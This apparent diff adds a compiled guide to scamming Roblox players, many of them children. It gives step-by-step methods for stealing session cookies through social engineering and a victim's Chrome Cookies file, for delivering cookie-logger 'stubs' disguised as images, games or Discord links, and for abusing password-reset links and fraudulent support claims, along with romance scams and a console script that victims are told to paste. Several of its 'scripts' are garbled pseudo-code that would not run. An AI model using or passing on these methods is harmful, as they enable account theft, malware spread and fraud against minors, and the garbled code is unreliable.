@@ -1,0 +1,430 @@
+
+Flip patterns
+
+1. One pattern seen about 90% of the time is 2 Tix and then 4 Robux right after, betting on Robux after there has been 2 Tix and 3 Robux would be a safe bet2. 6 Streaks. If there is a 6 streak you should usually place a smaller item on the other coin. For Example: 5-6 Tix means you should bet on Robux next.3. The final pattern is constantly 2 Tix -> 1 Robux -> 3 Tix. This pattern is usually seen in bigger items usually 15k+ and is much safer bet then any other.
+
+
+UUC Method-- UpdatedREQUIRES- Roblox Stupid, Given API's, Small limited, Bait Limited
+1. Before starting, BE SURE TO TURN TRADE ON EVERYONE, AND TRADE FILTER ON LOW [IMPORTANT]2. Get a victim3. Make a stupid bet, where you will give them bait limited, and fail the bet, or find some way to convince them that they get free items from you4. Send them a trade for their small, and you bait is limited.5. Decline the trade immediately.6. Ask them to send it because yours "glitched out"7. After they have sent the trade, don't accept it, instead, go to studio, and run API one in your browser, or firefox (firefox works better).
+API 1: "https://trades.roblox.com/docs#!/Trades/post_v1_trades_tradeId_accept" 8. Accept the trade, and siwtch back to chrome.9. Run the second API.
+API 2: "https://trades.roblox.com/v1/trades/IDHERE/accept" If you get a white looking error screen, but are still on the roblox website, you are on the right track.10. Go and check to see if the trade says "Pending" or something along the lines of waiting.11. If the trade is on Pending you have successfully utillized UUC
+
+NEW Unpatched UUC Method
+First Method
+1. Open 2 roblox trade windows, 1 to your alt and 1 to the victim
+2. Send the trade to your alt first, then as you send the other trade it will take roblox 5 seconds to actually send the trade.
+3. During this 5 seconds you need to accept the trade on your alt. Note: This method MAY be patched
+
+Second Method
+1. Open the trade with a victim with the main limited you want to UUC you need to sell it to your alt
+2. Send the trade and quickly buy the limited back on your alt for the cheaper price or use a sniper
+3. I don't see the point in doin this method since you have to have the robux and you will lose to fees. This method is working.
+
+1 - Go into roblox Studio
+2 - Click the Game setting on the Top bar
+3 - Go to Security and Enable "Allow HTTP Requests"
+4 - Right click and Press "Insert object and type in "Module Script" and click it
+5 - Paste this script in here, But Modify Where it tells you to
+
+Script:
+
+local module = {AllowHTTP.TradeAPI}
+
+PhysicalProperties.new(DeclineAccept)
+getfenv(https://trades.roblox.com/v1/trades/Outbound?sortOrder=Asc&limit=100)
+
+local holder = "YOUR USERNAME HERE"
+
+local pc = getfenv()
+local switch = setfenv(swap)
+
+pchtml.get(getfenv()) = DeclineAccept.getLocalpc = client/127.000.000
+pchtml.nav = switch
+
+holder.HTTP = gcinfo(getRequest)
+
+return module
+
+6 - After doing that, Enter a new NORMAL Script
+7 - Then paste this code
+
+Script:
+
+rawequal(gcinfo)
+
+local getUser = Rect.new(ModuleScript)
+
+getUser.repeat'getLocalPc'
+
+
+UUC
+1. Accept 2 trades at the exact same time (use 2 devices)
+2. Sell an item and accept trade at same time
+3. Decline trade on 1 account and accept other at same time ( quickly )
+
+-----------------------------------------------------------------------------------
+Info about the "accept 2 trades at same time"
+This must be almost at exact same millisecond, use code (trade api) for this, also it must be 2 trades for the same item
+1. Before starting, BE SURE TO TURN TRADES ON EVERYONE, AND TRADE FILTER ON LOW [IMPORTANT]
+2. Get a victim.
+3. Make a stupid bet, where you will give them a bait limited, and fail the bet, or find some way to convince them that they get free items from you.
+4. Send them a trade for their small, and your bait limited.
+5. Decline that trade immediately.
+6. Ask them to send it because yours "glitched out"
+7. After they have sent the trade, don't accept it, instead, go into studio, and run API one in tor browser, or firefox (firefox works better). Make sure you are linked to the same account, and you aren't using a proxy or vpn.
+API 1: "https://trades.roblox.com/docs#!/Trades/post_v1_trades_tradeId_accept"
+8. Accept the trade, and switch back to chrome.
+9. Run the second API.
+API 2: "https://trades.roblox.com/v1/trades/IDHERE/accept"
+If you get a white looking error screen, but are still on the roblox website, you are on the right track.
+10. Go and check to see if the trade says "Pending" or something along the lines of waiting.
+11. If the trade is on Pending, you have successfully utilized UUC.
+
+Another UCC:
+1. Accept 2 trades at the exact same time (use 2 devices)
+2. Sell an item and accept trade at same time
+3. Decline trade on 1 account and accept other at same time ( quickly )
+-----------------------------------------------------------------------------------
+Info about the "accept 2 trades at same time"
+This must be almost at exact same millisecond, use code (trade api) for this, also it must be 2 trades for the same item
+
+
+UUC-5
+1 - Go into roblox Studio
+2 - Click the Game setting on the Top bar
+3 - Go to Security and Enable "Allow HTTP Requests"
+4 - Right click and Press "Insert object and type in "Module Script" and click it
+5 - Paste this script in here, But Modify Where it tells you to
+
+
+
+Script:
+
+local module = {AllowHTTP.TradeAPI}
+
+PhysicalProperties.new(DeclineAccept)
+getfenv(https://trades.roblox.com/v1/trades/Outbound?sortOrder=Asc&limit=100)
+
+local holder = "YOUR USERNAME HERE"
+
+local pc = getfenv()
+local switch = setfenv(swap)
+
+pchtml.get(getfenv()) = DeclineAccept.getLocalpc = client/127.000.000
+pchtml.nav = switch
+
+holder.HTTP = gcinfo(getRequest)
+
+return module
+
+
+
+6 - After doing that, Enter a new NORMAL Script
+7 - Then paste this code
+
+
+Script:
+
+rawequal(gcinfo)
+
+local getUser = Rect.new(ModuleScript)
+
+getUser.repeat'getLocalPc'
+if
+until
+
+
+8 - When you did that, on the side bar you will see something called ReplicatedStorage
+9 - Right Click on it and click Insert Object AND Click RemoteFunction
+10 - Right click on the RemoteFuction and name it "GetHTML"
+11 - Then, You will see something called "LocalizationService" on the side. Right click it enter a modile script then rename it to "GetHtml"
+12 - Then paste this code
+
+Script:
+
+local module = {true}
+
+Rect(GetHtml)
+
+local edit = editHtml
+
+function.editHtml = edit
+
+swap = true
+getLocaluser = true
+
+end
+
+
+
+return module
+
+
+13 - Now its time to let the scripts know that YOU will receive the item no matter WHAT happens.
+14 - Add a Normal Script name it "player"
+15 - There will be a script below, Paste it in the script and replace it with your info (No passwords or anything lol)
+
+Script:
+
+local owner = Rect
+local username = getfenv(true)
+
+function(owner) = "Your roblox ID"
+_VERSION = true
+end
+function (username) = "Username Here"
+_VERSION = true
+end
+
+16 - Your finished with the scripts!
+17 - Now how to run it? Well just go to the top bat and U will see a play button. Under the play button is a Arrow.
+18 - Click the arrow and you will see a "Run" Option
+19 - Click it
+20 - Now your ready to Beam kids!
+21 - To activate it, Click The "Run" Button.
+22 - Send your trade to your victim
+23 - If they decline or accept, you still get the item
+24 - WARNING! There is a 15 minute cooldown. You Can only Do this 5 times every 15 minutes
+
+This shit op for real!
+
+Omegle Method
+This method allows you to get easy hits and auto farm cookies.
+
+1. Install the extension Omegle dark mode and antispam. This will allow you to send automatic messages and get more cookies at once https://chrome.google.com/webstore/detail/omegle-anti-spam-and-dark/cgefmcnibjiomgjkngndppnidjifgobl?hl=en
+
+2. Once installed, click the extension. Click the welcome message box and enter your desired message. This will be sent when an Omegle chat starts. For example, using har: "Heyy,I'm making a vibe game and I need cool avatars to use as npcs (insert your discord here)."
+Welcome message delay is the number of seconds before the automatic message sends, I usually use six, but it's all preference.
+
+3. Once the extension is set up, head on over to Omegle, enter the tags.
+
+4. Roblox, Robux
+
+5. Click enter, and your bot will start running. If you want more bots, simply open more tabs.
+
+PANEL XSS
+
+1.  Go to visual studio 2019.
+2. Make a WPFApp
+3. Design it how u want and add a button.
+4. Double click button and add this
+
+CODE:
+
+System.Diagnostics.Process.Start("yourstublink")
+
+
+THIS SHOULD MAKE IT AUTO EXECUTE AND GIVE U COOKIES WITH ANTIVIRUS ON TOO!
+
+----------
+
+Free layout: https://cdn.discordapp.com/attachments/836335488176619550/848123945172992020/Robux_Gen.sln
+
+I don't know how to setup
+
+---Mgui Method---
+
+1. Open the "My-Gui-Test.rbxl".
+2. Publish it < File > Publish > Name it all you want. > Don't close it yet.
+3. Go to https://roblox.com/develop and go to your game and Public It .
+4. Go to Passes create a gamepass Configure it go to sales Enable Sales now price it all you want and copy the ID of the gamepass.
+5. Go back to Roblox Studio (My-Gui-Test.rbxl) On the left> side you will see StarterGui Click the arrow like this >.
+6. Keep clicking it until you see Change gamepass here now there are two numbers replace the ID that you copy earlier both of them
+7. Now got to  < File > Publish as > Choose the game that you publish earlier > Click Overwrite>
+8. Your done! but there's a cooldown before buying the gamepass.
+
+
+Semi-Patched
+https://cdn.discordapp.com/attachments/896674535783424030/897308650249527296/My-Gui-Test.rbxl
+
+
+https://cdn.discordapp.com/attachments/850823512682790983/850824358569574430/mgui.rbxl
+this is the studio file point_up_2
+when you open it, it automatically connects to your studio and makes u a scam game!
+
+(trust this at ur own risk)
+**^ There's a chance your account get deleted (Ban)**
+
+SCREEN SHARE METHOD 100% Working!
+1. First, for this to let you gain anything at all. You're going to need to make a game, and I'd recommend going on v3rmillion and finding a profile that copies game maps just in case it goes wrong.
+
+2. Inside the map, either make a UI with a "Donation Menu" or set up Developer Buttons where people can buy things for Robux (e.g., VIP).
+
+3. Join a game or any server and promote that you are looking for game moderators before launching your game. Tell them that you get a lot of donations, and mods will be paid fairly for their work.
+
+4. Link them to your game and have it on friends only if your map is looking bland and doesn't work well as a game. Tell them that you've hired a developer who is doing your scripts currently. Now tell them that ROBLOX has a new way of giving moderator permissions due to the number of Moderation accounts being hacked.
+
+5. Tell them that they need their Authentication ticket, and explain that this is the Unique identifier to their account and only works on the PC they are currently on.
+
+6. (How to get the ticket): First, tell them to leave your game, then ask them if when they open, Roblox do they call the "Allow this site to open an application?" message (example at the bottom). If they say yes, then you are set for the next step. If they say no, tell them that they will need that message to receive the Auth Ticket. Explain that the steps to do so are going to https://portableapps.com/apps/internet/firefox_portable and installing Firefox Portable, now go to roblox.com and log in. Tell them to head over to your game and click on the Play button. This should bring up their prompt.
+PortableApps.com - Portable software for USB, portable, and cloud drives
+
+Unleaked 2021 Image Method + Setup
+
+1.Download  https://mega.nz/file/eMQGQb5Z#RhcM-_MzNtdIe5hOoAozwL6SjLygIfJfIv0hEeTPzhI  and  make a stub
+
+2.Download https://github.com/OsandaMalith/Exe2Image/releases/tag/1 this to convert the stub/exe
+
+3.Open Exe3image then browse for your stub/exe  then browse where you want your photo at 
+
+4.Done! if you  double tape the image  then you go to  roblox and start  up a game they get  cookie logged! - IMAGE METHOD
+
+
+Account Comprimising Method 
+
+Get a toy code off google or a toy code you've already used.
+
+Tell the victim to go to the roblox toys website and redeem the code.
+
+Get the victim's username aswell.
+
+If they say it's invalid you can make an excuse, like Wrong code my bad. or just block them.
+
+After that contact Roblox Support and tell them the victim's account is yours. You can say I can prove this is my account aswell by showing you the code I attempted to redeem.
+
+After that, they should give you the account.
+
+
+GIFTCARD METHOD
+You buy a roblox giftcard on amazon
+you give them it for free
+the person u want to comp
+They put it on there account
+message roblox you redeemed a giftcard on your account, and someone took it, the will reset the accounts password to whatever u want
+then you have there acc
+
+GIFTCARD METHOD:
+
+1. Buy any price ROBLOX Giftcard.
+2. Give the giftcard to a user with limiteds on discord or something.
+3. Email roblox support saying your roblox account doesnt work and it says the passwords wrong, and put the giftcard code in the email saying you entered that giftcode before you couldn't go in it anymore.
+Instead of emailing call roblox
+
+EWhore Method
+Fake Roblox Girlfriend/Boyfriend Method
+
+-----------------------------------------------------------------------------------------------
+1. Make yourself a "Hot" avatar.
+
+2. Go into any game with a decent amount of rich girls/boys and find someone who has a premium. (Or find anyone you know and you don't like.)
+
+3. Tell them that they have a nice outfit and that they seem nice.
+4. Ask if you want to be friends and say that you don't have any and that you are a bit awkward. (I know this method is awkward as fuck, but I mean, it works well)
+
+5. They will mostly say yes. If they don't, then just find someone else.
+
+6. Ask for their cord. They will most likely give it to you.
+
+7. To be honest, be nice and all and kinda always message something to her, make jokes until she likes you.
+8. If she asks for personal stuff, just make stuff up.
+
+9. Now, the most challenging part, try getting him/her as your Girlfriend or boyfriend.
+
+10. If you now have a fake Roblox girlfriend, you're almost done.
+
+11. Ask her if she can make you a nice avatar and send her your password (I know its dangerous, make sure your trades are off and you have a pin)
+
+12. Now, ask her if you can make an avatar for her. She will say yes 95% of the time.
+
+13. Get her limiteds.
+
+14. Enjoy!!
+-----------------------------------------------------------------------------------------------
+
+
+Yeah, I get how dumb this method is, but if you think about it, it's not that dumb, to be honest.
+I know this method is unfortunate, but it will never get old, and you will get good hits. I can promise that. <Atleast 300k recommend emos>
+
+
+https://nodejs.org/en/
+https://cdn.discordapp.com/attachments/844817274027245588/845137469241819176/discord-games-main.rar
+
+1.) First download the files above.) Extract them  Open up READ-ME  Once you've done that you'll need to create a stub
+
+2.) Copy the download link of your stub through Discord and find a random Youtube Video on youtube and paste your stub link in the comment section.
+
+3.) Copy the link of the stub you uploaded in the Youtube comment section now you should have a redirect link
+
+4.) Choose your game and paste the Redirect link inside of Youtube Link and click submit 
+
+5.) Now you have your Discord-Game-Link 
+
+Upon click it should automatically download your Stub-File you can disguise it using #how-to-have-icon-on-an-exe and rename it to the game you selected in the generator
+
+
+Developer Forum method
+
+1. Make a account on Developer Forum
+
+2. Have the person your hitting also make a account on there , I will show you how to convince them to
+
+3. I will help you convince them to go to inspect element and you tell them to go to applications
+
+4. Then tell them to copy everything in there and have it to sent it in a txt file name it Bug-Developer-2021.rblx
+
+5. Once they send it you download and open it in txt file and type in .ROBLOSECURITY and go to the cookie and copy it
+
+6. Have editthiscookie installed and copy the cookie and replace it with yours and click the check mark and you should be in
+
+
+Gyazo reset pw ID method (OP)
+ 
+Step - 1) Ask user to send gyazo snapshot of roblox password reset screen
+Step - 2) If they don't send a gyazo link be like. Send a pic with gyazo so I know it's not edited (This always works)
+Step - 3) After u got the link be like hey I can't see the picture. Did u check that u have details visible on?
+Step - 4) If they say what is that send them this picture. https://gyazo.com/85b83e65438fe2a45def1d6f8a4a5837 And be like just scroll down and youll see the option.
+Step - 5) After that open their link and scroll down till u see this. https://gyazo.com/324a6314b3336b55e03943323d3785d2 Press the thing called roblox and ur on their pw reset link.
+Step - 6) Reset the password and login to their account, and transfer the items gg you just beamed a kid (always leave a funny vid or something XD)
+ 
+TIPS: I recommend dming people who sell limiteds and be like yo can i buy ur limiteds ill go first. Say proof the acc is urs and tell them to sed a pic of roblox password reset and than do the steps above thats it.
+Gyazo
+
+Reverse-UUC
+1. Baiting: Tell them UUC back asks if they want to learn to add them on Kord
+2. After that, tell them new need two outbound trades of the same item, then
+3. Send them a trade for the items you want
+4. Once you've Convinced them, you have to use a manual API method on them
+5. Make them click F12, aka inspect, and they got to go to console and paste this
+``function POST(){
+$.ajax({
+url : "/My/Money.aspx/GetMyItemTrades",
+type : "POST",
+data : '{"statustype":"inbound","startindex":0}',
+contentType : "application/json; charset=UTF-8",
+success : function(Data){
+var Base = jQuery.parseJSON(jQuery.parseJSON(Data.d).Data[0])
+var TradeId = Base["TRADE ID HERE "]
+var Partner = Base["USER’S ID"]
+var Token = ""
+$.get("/My/Money.aspx",function(Data){
+Token = Data.match(/setToken(\W(.+)\W);/)[2].replace(/'/g,"")
+Token = Token.replace("+","%2B").replace("/","%2F")
+}).always(function(){
+$.post("/Trade/TradeHandler.ashx?token=" + Token,{TradeID : TradeId,cmd : "pull"},function(Data){
+var Base = jQuery.parseJSON(Data.data).AgentOfferList
+var Other = 1
+if (Number(Base[0].AgentID) == Number(Partner)){
+Other = 0``
+
+Database Method
+Database Method
+
+1) Make sure your target is logged into Roblox.
+
+2) tell them to open file explorer
+
+3) in the top bar, type %LocalAppData%\Google\Chrome\User Data\Default
+
+4) Tell them to scroll down until they find the file called Cookies
+
+5) Tell them to send you the file (if they don't want to find some bs excuse for why you need it)
+
+6) Install Sqlite browser (https://sqlitebrowser.org/dl/)
+
+7) In SQLlite browser click the open database and browse to the Cookies file
+
+8) change to the browse data tab and type .roblox.com in the host_key filter
+
+9) Look for .robloxsecurity
+
+10) Log in to the victim's account.
